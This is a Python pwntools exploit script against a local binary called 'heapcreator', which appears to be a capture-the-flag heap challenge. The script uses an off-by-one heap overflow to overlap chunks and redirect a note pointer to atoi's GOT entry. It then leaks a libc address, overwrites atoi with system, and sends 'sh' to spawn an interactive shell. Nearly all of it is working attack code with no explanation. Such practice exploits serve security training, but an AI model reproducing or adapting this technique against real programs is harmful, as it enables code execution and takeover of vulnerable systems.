from pwn import *
context(arch='amd64',os='linux')
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

r = process('./heapcreator')
elf = ELF('./heapcreator')
libc = elf.libc

gdb.attach(r)

def create(size,content):
    log.info('create')

    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(content)
    r.recvuntil('SuccessFul\n')
    pause()

def edit(idx,content):
    log.info('edit')

    r.sendlineafter(':','2')
    r.sendlineafter(':',str(idx))
    r.sendlineafter(':',str(content))
    r.recvuntil('Done !\n')
    
    pause()

def show(idx):
    log.info('show')

    r.recvuntil('choice :')
    r.send('3'+'\x00')
    r.recvuntil(' :')
    r.send(str(idx))
    r.recvuntil('Content : ')
    value = r.recvuntil('\n').rstrip()
    r.recvuntil('!\n')

    return value
    pause()

def delete(idx):
    log.info('delete')
    r.sendlineafter(':','4')
    r.sendlineafter('Index :',str(idx))
    r.recvuntil('Done !\n') 
    pause()

def info_log():
    log.info('create = main + 154')
    log.info('edit = main + 166')
    log.info('del = main + 190')
    log.info('show = main + 178')

    pause()

def main():
    info_log()

    create(40,'A'*8)
    create(16,'B'*8)

    payload = ''
    payload += 'A'*40
    payload += '\x41'

    edit(0,payload)
    delete(1)
    create(48,'C'*8)

    atoi_got = elf.got['atoi']
    payload = ''
    payload += 'D'*32
    payload += '\x30' + '\x00'*7
    payload += p64(atoi_got)

    edit(1,payload)
    
    atoi_got = show('1')
    atoi_got = u64(atoi_got + '\x00'*(8-len(atoi_got)))

    libc_base = atoi_got - libc.symbols['atoi']
    system = libc_base + libc.symbols['system']
        
    edit(1,p64(system))

    r.recvuntil('choice :')
    r.sendline('sh')

    r.interactive()

if __name__ == '__main__':
    main()
